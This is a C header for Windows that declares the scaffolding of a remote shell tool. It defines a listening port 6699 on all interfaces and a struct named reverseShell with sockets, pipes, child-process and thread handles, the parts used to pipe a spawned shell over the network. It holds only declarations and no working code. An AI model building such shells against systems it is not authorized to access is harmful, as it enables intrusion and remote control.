#pragma once

#include <windows.h>

#define HOSTNAME "0.0.0.0"
#define PORT "6699"

#define BUFFER_SIZE 4096

#define PROCESS_STOP "Global\\stop_tinky_processes"

#define SUCCESS 1
#define FAILURE 0

typedef struct reverseShell {
	// socket {
	addrinfo	addrHints;
	addrinfo	*addrResult;

	SOCKET		listenSocket;
	SOCKET		clientSocket;
	// }

	// pipe {
	HANDLE					childRead ;
	HANDLE					parentWrite;

	HANDLE					childWrite;
	HANDLE					parentRead;

	SECURITY_ATTRIBUTES		secAttributes;
	// }

	// childProcess {
	STARTUPINFOW		startupInfo;
	PROCESS_INFORMATION	processInfo;
	// }

	// threads {
	BYTE	g_stopRoutines;
	HANDLE	threadListener;
	HANDLE	threadSender;
	//

	HANDLE	stopEventsignal;
}	reverseShell_t;